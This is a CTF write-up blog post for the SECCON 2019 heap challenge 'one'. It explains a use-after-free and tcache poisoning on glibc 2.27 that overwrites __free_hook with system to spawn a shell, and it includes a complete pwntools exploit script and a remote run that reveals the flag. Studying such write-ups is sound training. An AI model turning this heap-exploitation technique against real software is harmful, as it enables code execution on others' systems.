@@ -1,0 +1,323 @@
+I"n�<p>I didn’t get much time this weekend for this CTF due to having to study for two tests. I only spent a couple hours and managed to solve <code class="highlighter-rouge">one</code> and <code class="highlighter-rouge">sum</code>, the two easy pwn challenges.</p>
+
+<p><code class="highlighter-rouge">one</code> was a glibc 2.27 heap exploitation challenge. It has a UAF vulnerability when freeing a chunk.</p>
+
+<p>The restriction that makes this challenge interesting is that you can only ever have a pointer to <strong><em>one</em></strong> malloc’d chunk at a time.</p>
+
+<h3 id="challenge"><strong>Challenge</strong></h3>
+
+<ul>
+  <li><strong>Category:</strong> pwn</li>
+  <li><strong>Points:</strong> 264</li>
+  <li><strong>Solves:</strong> 68</li>
+</ul>
+
+<blockquote>
+  <p>Host : <strong>one.chal.seccon.jp</strong>
+Port : <strong>18357</strong></p>
+
+  <ul>
+    <li><a href="https://score-quals.seccon.jp/files/one_ef36d5ef6169aeda65259f627f282930b93cf6e5">one</a></li>
+    <li><a href="https://score-quals.seccon.jp/files/libc-2.27.so_18292bd12d37bfaf58e8dded9db7f1f5da1192cb">libc-2.27.so</a></li>
+  </ul>
+</blockquote>
+
+<h3 id="solution"><strong>Solution</strong></h3>
+
+<p>The binary itself is not stripped, making it very easy to reverse engineer. It has all protections set:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/seccon-2019/one<span class="nv">$ </span>checksec one
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/seccon-2019/one/one'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></div></div>
+
+<p>It has the following functionality:</p>
+
+<ul>
+  <li><strong>add</strong>: <code class="highlighter-rouge">malloc</code>’s a 0x40 sized chunk and stores a pointer to it in the global variable <code class="highlighter-rouge">memo</code>. Let’s you read in 0x3f bytes into it using <code class="highlighter-rouge">fgets</code>. Any time a new chunk is <code class="highlighter-rouge">malloc</code>‘d, the global variable is overwritten with the new chunk.</li>
+  <li><strong>show</strong>: Uses <code class="highlighter-rouge">puts</code> to output the content of the chunk that the global variable <code class="highlighter-rouge">memo</code> currently points to. Checks to make sure <code class="highlighter-rouge">memo</code> is set first.</li>
+  <li><strong>delete</strong>: Frees the chunk pointed to by the global variable <code class="highlighter-rouge">memo</code>. Checks to make sure <code class="highlighter-rouge">memo</code> is actually set first. Does not zero out <code class="highlighter-rouge">memo</code> after the freeing.</li>
+</ul>
+
+<p>Knowing all of this, the steps to exploitation are as follows:</p>
+
+<ol>
+  <li>Get a heap leak.</li>
+  <li>Use the heap leak and the tcache poisoning attack to get a chunk at a heap address where we have a forged 0x91 sized chunk.</li>
+  <li>Free this 0x91 sized chunk 7 times to fill up the 0x80 tcache bin. Free one more time to get a libc leak.</li>
+  <li>Do a tcache poisoning attack to overwrite <code class="highlighter-rouge">__free_hook</code> to <code class="highlighter-rouge">system</code>.</li>
+  <li>Free a chunk whose first 8 bytes are <code class="highlighter-rouge">'/bin/sh\x00'</code> to call <code class="highlighter-rouge">system('/bin/sh\x00')</code> and get a shell.</li>
+</ol>
+
+<p>First, the heap leak is easy. I added one chunk and freed it four times to get the leak. The reason I freed four times is because we’re going to do two tcache poisoning attacks soon, and those will mess up the count that the 0x40 tcache bin keeps (of the number of chunks in that specific bin). We free four times to make the count go up to 4, so that when we do the tcache poisoning attacks later, the count actually fixes itself.</p>
+
+<p>After the four frees, simply showing this chunk will give us a heap leak since its FD pointer will point to itself:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ----------- Heap Leak ------------
+# Prepare
+</span><span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x3e</span><span class="p">)</span>
+
+<span class="c1"># We do four frees to keep the 0x40 tcache bin count correct
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">free</span><span class="p">()</span>
+
+<span class="c1"># Leak the fourth chunk's address on the heap
+</span><span class="n">show</span><span class="p">()</span>
+
+<span class="n">heap_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Heap leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Next, we “empty” the 0x40 tcache bin. We do this by first allocating one of our four free chunks from above out of it and setting its FD to null. We allocate again to get the same chunk back, but since the FD was set to NULL, the tcache bin is now empty. However, its count is still set to 2.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ----------- Libc Leak ------------
+# Empty the 0x40 tcache bin first
+</span><span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Set FD to null here
+</span><span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 0x40 tcache bin now empty
+# Note that after the above, the 0x40 tcache bin will have count = 2
+</span></code></pre></div></div>
+
+<p>Next, we create four chunks and make it so that all of them have their FD pointer set to a legitimate value (our heap leak), and also make them all look like they have fake 0x91 sized chunks within them with their <code class="highlighter-rouge">PREV_INUSE</code> bits set:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Create four chunks to prep for libc leak
+# Make all of them have fake chunks in them with PREV_INUSE bits set
+# And make all of them have valid FD pointers as well
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">((</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">))</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
+</code></pre></div></div>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">gx</span> <span class="mh">0x000055cfa8a992c0</span><span class="o">-</span><span class="mh">0x10</span>
+<span class="mh">0x55cfa8a992b0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000051</span> <span class="c1">// Chunk 1</span>
+<span class="mh">0x55cfa8a992c0</span><span class="o">:</span> <span class="mh">0x000055cfa8a99270</span>      <span class="mh">0x0000000000000091</span>
+<span class="mh">0x55cfa8a992d0</span><span class="o">:</span> <span class="mh">0x000055cfa8a99270</span>      <span class="mh">0x0000000000000091</span>
+<span class="mh">0x55cfa8a992e0</span><span class="o">:</span> <span class="mh">0x000055cfa8a99270</span>      <span class="mh">0x0000000000000091</span>
+<span class="mh">0x55cfa8a992f0</span><span class="o">:</span> <span class="mh">0x000000000000000a</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x55cfa8a99300</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000051</span> <span class="c1">// Chunk 2</span>
+<span class="mh">0x55cfa8a99310</span><span class="o">:</span> <span class="mh">0x000055cfa8a99270</span>      <span class="mh">0x0000000000000091</span>
+<span class="mh">0x55cfa8a99320</span><span class="o">:</span> <span class="mh">0x000055cfa8a99270</span>      <span class="mh">0x0000000000000091</span>
+<span class="mh">0x55cfa8a99330</span><span class="o">:</span> <span class="mh">0x000055cfa8a99270</span>      <span class="mh">0x0000000000000091</span>
+<span class="mh">0x55cfa8a99340</span><span class="o">:</span> <span class="mh">0x000000000000000a</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x55cfa8a99350</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000051</span> <span class="c1">// Chunk 3</span>
+<span class="mh">0x55cfa8a99360</span><span class="o">:</span> <span class="mh">0x000055cfa8a99270</span>      <span class="mh">0x0000000000000091</span>
+<span class="mh">0x55cfa8a99370</span><span class="o">:</span> <span class="mh">0x000055cfa8a99270</span>      <span class="mh">0x0000000000000091</span>
+<span class="mh">0x55cfa8a99380</span><span class="o">:</span> <span class="mh">0x000055cfa8a99270</span>      <span class="mh">0x0000000000000091</span>
+<span class="mh">0x55cfa8a99390</span><span class="o">:</span> <span class="mh">0x000000000000000a</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x55cfa8a993a0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000051</span> <span class="c1">// Chunk 4</span>
+<span class="mh">0x55cfa8a993b0</span><span class="o">:</span> <span class="mh">0x000055cfa8a99270</span>      <span class="mh">0x0000000000000091</span>
+<span class="mh">0x55cfa8a993c0</span><span class="o">:</span> <span class="mh">0x000055cfa8a99270</span>      <span class="mh">0x0000000000000091</span>
+<span class="mh">0x55cfa8a993d0</span><span class="o">:</span> <span class="mh">0x000055cfa8a99270</span>      <span class="mh">0x0000000000000091</span>
+</code></pre></div></div>
+
+<p>Next, we do a tcache poisoning attack to get a chunk that is right below one of these 0x91 chunk headers. Using GDB, I found that <code class="highlighter-rouge">heap_leak + 0x60</code> was the right offset.</p>
+
+<p>We then simply free this 0x91 sized chunk 7 times to fill up the 0x80 tcache bin. The final and 8th free will send this chunk to the unsorted bin, which fills the chunk’s FD and BK pointers to the address of <code class="highlighter-rouge">main_arena+0x60</code>. We can then simply leak those pointers using <code class="highlighter-rouge">show</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Double free the last chunk
+</span><span class="n">free</span><span class="p">()</span> <span class="c1"># count = 3
+</span><span class="n">free</span><span class="p">()</span> <span class="c1"># count = 4
+</span>
+<span class="c1"># Set FD to one of the fake 0x91 chunks
+</span><span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_leak</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">))</span> <span class="c1"># count = 3
+</span><span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># count = 2
+</span><span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Got a 0x91 chunk, count = 1
+</span>
+<span class="c1"># Free 7 times to fill up tcache bin, 8th one goes into unsorted bin
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+    <span class="n">free</span><span class="p">()</span>
+
+<span class="c1"># Unsorted bin libc leak
+</span><span class="n">show</span><span class="p">()</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3ebca0</span> <span class="c1"># Offset found using gdb
+</span><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'__free_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>The unsorted bin libc leak can be seen in our forged 0x91 sized chunk here:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">10</span><span class="n">gx</span> <span class="mh">0x000055bbbae122c0</span><span class="o">-</span><span class="mh">0x10</span>
+<span class="mh">0x55bbbae122b0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000051</span>
+<span class="mh">0x55bbbae122c0</span><span class="o">:</span> <span class="mh">0x000055bbbae12270</span>      <span class="mh">0x0000000000000091</span>
+<span class="mh">0x55bbbae122d0</span><span class="o">:</span> <span class="mh">0x00007f57ed3eaca0</span>      <span class="mh">0x00007f57ed3eaca0</span> <span class="o">&lt;-</span> <span class="n">Libc</span> <span class="n">leak</span>
+<span class="mh">0x55bbbae122e0</span><span class="o">:</span> <span class="mh">0x000055bbbae12270</span>      <span class="mh">0x0000000000000091</span>
+<span class="mh">0x55bbbae122f0</span><span class="o">:</span> <span class="mh">0x000000000000000a</span>      <span class="mh">0x0000000000000000</span>
+</code></pre></div></div>
+
+<p>Now that we’ve got our leaks, we can do the final tcache poisoning attack. Remember those first four frees I did? This is where they matter.</p>
+
+<p>Right now, the 0x40 tcache bin looks something like this:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcache</span><span class="p">[</span><span class="mh">0x40</span><span class="p">]</span> <span class="n">count</span><span class="o">=</span><span class="mi">1</span>  <span class="o">&lt;-</span>  <span class="mh">0x55b71cb82270</span>  <span class="o">&lt;-</span>  <span class="mh">0x4141414141414141</span>
+</code></pre></div></div>
+
+<p>We currently have a pointer to that 0x91 sized chunk we just used to get the libc leak. However, in order to do the tcache poisoning attack, we need a chunk that we can free into a tcache bin <strong><em>and</em></strong> get back out of it. Since the 0x91 sized tcache bin is full and we can only allocate 0x40 sized chunks, if we malloc again, this next chunk in the 0x40 tcache bin will come out.</p>
+
+<p>The important thing to note here is that when it does come out, the bin count will have 1 subtracted from it. If we didn’t ensure to free four times at the beginning of our exploit, count here would become a negative number. Since it is unsigned, the negative number would be interpreted as a large positive number (in this case, probably 0xff), which would make it seem as if this tcache bin is full. This would prevent us from doing a tcache poisoning attack.</p>
+
+<p>Since we did free four times, the count will go down to 0 when we malloc this chunk out of the tcache bin, which will allow us to double free it and continue on with the tcache poisoning attack. This is why the first four frees were important.</p>
+
+<p>I won’t go into any detail about the tcache poisoning attack, it’s pretty self explanatory:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Tcache poisoning attack to overwrite __free_hook with system
+</span><span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># count = 0
+</span><span class="n">free</span><span class="p">()</span>
+<span class="n">free</span><span class="p">()</span>
+
+<span class="c1"># Overwrite __free_hook with system
+</span><span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+
+<span class="c1"># Call system("/bin/sh\x00")
+</span><span class="n">add</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+<span class="n">free</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">SECCON{4r3_y0u_u53d_70_7c4ch3?}</code></p>
+
+<p>Am I used to the tcache? :thinking:</p>
+
+<h3 id="final-exploit"><strong>Final Exploit</strong></h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./one'</span>
+<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'one.chal.seccon.jp'</span><span class="p">,</span> <span class="mi">18357</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.27.so'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">"LOCAL PROCESS"</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">"REMOTE PROCESS"</span>
+        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">get_base_address</span><span class="p">(</span><span class="n">proc</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"/proc/{}/maps"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pid</span><span class="p">),</span> <span class="s">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
+    <span class="n">script</span> <span class="o">=</span> <span class="s">"handle SIGALRM ignore</span><span class="se">\n</span><span class="s">"</span>
+    <span class="n">PIE</span> <span class="o">=</span> <span class="n">get_base_address</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">script</span> <span class="o">+=</span> <span class="s">"set $_base = 0x{:x}</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">PIE</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
+        <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">PIE</span><span class="o">+</span><span class="n">bp</span><span class="p">)</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+    <span class="n">debug</span><span class="p">([])</span>
+
+<span class="c1"># ----------- Heap Leak ------------
+# Prepare
+</span><span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x3e</span><span class="p">)</span>
+
+<span class="c1"># We do four frees to set the 0x40 tcache bin count to 4
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">free</span><span class="p">()</span>
+
+<span class="c1"># Leak the fourth chunk's address on the heap
+</span><span class="n">show</span><span class="p">()</span>
+
+<span class="n">heap_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Heap leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">))</span>
+
+<span class="c1"># ----------- Libc Leak ------------
+# Empty the 0x40 tcache bin first
+</span><span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Set FD to null here
+</span><span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># 0x40 tcache bin now empty
+# Note that after the above, the 0x40 tcache bin will have count = 2
+</span>
+<span class="c1"># Create four chunks to prep for libc leak
+# Make all of them have fake chunks in them with PREV_INUSE bits set
+# And make all of them have valid FD pointers as well
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">((</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">))</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>
+
+<span class="c1"># Double free the last chunk
+</span><span class="n">free</span><span class="p">()</span> <span class="c1"># count = 3
+</span><span class="n">free</span><span class="p">()</span> <span class="c1"># count = 4
+</span>
+<span class="c1"># Set FD to one of the fake 0x91 chunks
+</span><span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_leak</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">))</span> <span class="c1"># count = 3
+</span><span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># count = 2
+</span><span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># Got a 0x91 chunk, count = 1
+</span>
+<span class="c1"># Free 7 times to fill up tcache bin, 8th one goes into unsorted bin
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+    <span class="n">free</span><span class="p">()</span>
+
+<span class="c1"># Unsorted bin libc leak
+</span><span class="n">show</span><span class="p">()</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3ebca0</span> <span class="c1"># Offset found using gdb
+</span><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'__free_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+
+<span class="c1"># Tcache poisoning attack to overwrite __free_hook with system
+</span><span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># count = 0
+</span><span class="n">free</span><span class="p">()</span>
+<span class="n">free</span><span class="p">()</span>
+
+<span class="c1"># Overwrite __free_hook with system
+</span><span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+<span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+
+<span class="c1"># Call system("/bin/sh\x00")
+</span><span class="n">add</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
+<span class="n">free</span><span class="p">()</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/seccon-2019/one<span class="nv">$ </span>./exploit.py REMOTE
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/seccon-2019/one/one'</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/seccon-2019/one/libc-2.27.so'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+REMOTE PROCESS
+<span class="o">[</span>+] Opening connection to one.chal.seccon.jp on port 18357: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Heap leak: 0x55571ecaa360
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc leak: 0x7f620fa82ca0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7f620f697000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> __free_hook: 0x7f620fa848e8
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> system: 0x7f620f6e6440
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span><span class="nb">ls
+</span>flag.txt
+one
+<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+SECCON<span class="o">{</span>4r3_y0u_u53d_70_7c4ch3?<span class="o">}</span>
+<span class="nv">$ </span> 
+</code></pre></div></div>
+:ET
